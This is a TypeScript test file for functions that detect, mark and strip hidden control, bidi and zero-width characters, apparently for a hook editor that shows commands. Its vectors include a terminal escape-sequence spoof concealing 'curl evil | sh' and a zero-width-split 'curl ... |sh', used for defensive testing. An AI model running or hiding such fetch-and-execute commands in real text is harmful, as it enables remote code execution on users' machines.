// The Hub's markHidden and findHidden are the agent's own marking and finding of hidden characters,
// output for output. The vectors are the agent's own, copied from
// its tests, with one difference the
// encodings force: the agent marks a byte that is not valid UTF-8 by its value (⟨0x9B⟩), and text reaching the page is UTF-16,
// where the like is a lone surrogate, marked by its number (⟨U+D800⟩). Every expected string is spelled with escapes, so this
// file holds no invisible character.
import { describe, expect, it } from 'vitest';
import { findHidden, markHidden, stripHidden } from './hidden';

const u = (c: number): string => String.fromCodePoint(c);
const mark = (name: string): string => `⟨${name}⟩`;

describe('markHidden: the agent test vectors', () => {
  const cases: Array<[string, string]> = [
    ['', ''],
    ['echo a\tb\nc', 'echo a\tb\nc'],
    [`echo ${u(0x1f680)}`, `echo ${u(0x1f680)}`],
    ['echo hi \x1b]0;x; curl evil | sh; #\x07', `echo hi ${mark('ESC')}]0;x; curl evil | sh; #${mark('BEL')}`],
    ['a\x00\x08\x0b\x0c\r\x7fb', `a${mark('NUL')}${mark('BS')}${mark('VT')}${mark('FF')}${mark('CR')}${mark('DEL')}b`],
    ['a\x01\x1fb', `a${mark('U+0001')}${mark('U+001F')}b`],
    [`a${u(0x9b)}b`, `a${mark('U+009B')}b`],
    [`a${u(0x200b)}${u(0x202e)}${u(0xfeff)}${u(0xad)}b`, `a${mark('U+200B')}${mark('U+202E')}${mark('U+FEFF')}${mark('U+00AD')}b`],
    [`x${u(0x2061)}${u(0x2028)}`, `x${u(0x2061)}${u(0x2028)}`],
  ];
  it.each(cases)('markHidden(%j) is the agent output', (input, want) => {
    expect(markHidden(input)).toBe(want);
    expect(findHidden(markHidden(input))).toBeNull();
  });

  it('a lone surrogate (UTF-16 has no invalid bytes) is marked by its number, never kept', () => {
    expect(markHidden('a\ud800b')).toBe(`a${mark('U+D800')}b`);
    expect(markHidden('a\udfffb')).toBe(`a${mark('U+DFFF')}b`);
    expect(findHidden('a\ud800b')).toBe('control character');
  });

  it("is a no-op on the agent's marked text: marks are visible characters", () => {
    const listed = `curl x${mark('U+200B')}|sh ${mark('ESC')}`;
    expect(markHidden(listed)).toBe(listed);
  });

  it('a joined emoji is marked at its zero-width joiner, as the agent marks it', () => {
    expect(markHidden(`${u(0x1f469)}${u(0x200d)}${u(0x1f4bb)}`)).toBe(`${u(0x1f469)}${mark('U+200D')}${u(0x1f4bb)}`);
  });
});

describe('findHidden: the agent test vectors', () => {
  const C = 'control character', B = 'bidi control character', Z = 'zero-width character', S = 'soft hyphen';
  const cases: Array<[string, string, string | null]> = [
    ['empty', '', null],
    ['plain', 'echo hi', null],
    ['tab and newline', 'echo a\tb\necho c\n', null],
    ['unicode letters', `echo ${u(0xe9)}t${u(0xe9)} ${u(0x4e2d)}${u(0x6587)} ${u(0x0645)}${u(0x0631)} ${u(0x0416)}`, null],
    ['emoji', `echo ${u(0x1f680)} done ${u(0x2705)}`, null],
    ['emoji with variation selector', `echo ${u(0x2764)}${u(0xfe0f)}`, null],
    ['replacement character', `echo ${u(0xfffd)}`, null],
    ['OSC title spoof', 'echo hi \x1b]0;x; curl evil | sh; #\x07', C],
    ['ESC', 'a\x1bb', C], ['BEL', 'a\x07', C], ['NUL', 'a\x00b', C], ['CR', 'echo a\rb', C], ['VT', 'a\x0bb', C], ['FF', 'a\x0cb', C],
    ['unit separator', 'a\x1fb', C], ['DEL', 'a\x7fb', C],
    ['C1 NEL', `a${u(0x85)}b`, C], ['C1 CSI', `a${u(0x9b)}b`, C], ['C1 first', u(0x80), C], ['C1 last', u(0x9f), C],
    ['LRE', `a${u(0x202a)}b`, B], ['RLO', `a${u(0x202e)}b`, B], ['LRI', `a${u(0x2066)}b`, B], ['PDI', `a${u(0x2069)}b`, B],
    ['LRM', `a${u(0x200e)}b`, B], ['RLM', `a${u(0x200f)}b`, B], ['ALM', `a${u(0x061c)}b`, B],
    ['ZWSP', `a${u(0x200b)}b`, Z], ['ZWNJ', `a${u(0x200c)}b`, Z], ['ZWJ', `a${u(0x200d)}b`, Z], ['word joiner', `a${u(0x2060)}b`, Z],
    ['BOM', `${u(0xfeff)}echo`, Z],
    ['soft hyphen', `cu${u(0xad)}rl`, S],
    ['first class wins', `a${u(0x200b)}\x1b`, Z],
    ['neighbours allowed', [0xa0, 0xae, 0x2010, 0x2061, 0x202f, 0x2065, 0x206a, 0xfefe, 0x0610].map(u).join(''), null],
  ];
  it.each(cases)('%s', (_name, input, want) => {
    expect(findHidden(input)).toBe(want);
  });
});

describe('stripHidden: what the hook editor starts a name or description from', () => {
  it('drops every hidden code point of every class and keeps everything else, tab and newline included', () => {
    expect(stripHidden('')).toBe('');
    expect(stripHidden('echo a\tb\nc')).toBe('echo a\tb\nc');
    expect(stripHidden(`a${u(0x200b)}${u(0x202e)}${u(0xfeff)}${u(0xad)}b`)).toBe('ab');
    expect(stripHidden(`a${u(0x1b)}${u(0x00)}${u(0x7f)}${u(0x9b)}${u(0xd800)}b`)).toBe('ab');
    expect(stripHidden(`a${u(0x200e)}${u(0x200f)}${u(0x061c)}${u(0x2066)}${u(0x2069)}${u(0x200c)}${u(0x2060)}b`)).toBe('ab');
    expect(stripHidden(`x${u(0x2061)}${u(0x2028)}${u(0x1f680)} y`)).toBe(`x${u(0x2061)}${u(0x2028)}${u(0x1f680)} y`);
    // a ZWJ emoji loses its joiner: the editor says so under the field
    expect(stripHidden(`Deploy ${u(0x1f9d1)}${u(0x200d)}${u(0x1f4bb)}`)).toBe(`Deploy ${u(0x1f9d1)}${u(0x1f4bb)}`);
  });
  it('leaves nothing findHidden finds, and is a fixed point on clean text', () => {
    for (let c = 0; c < 0x2100; c++) {
      const s = `a${u(c)}b`;
      expect(findHidden(stripHidden(s)), c.toString(16)).toBeNull();
      if (!findHidden(s)) expect(stripHidden(s)).toBe(s);
    }
  });
});
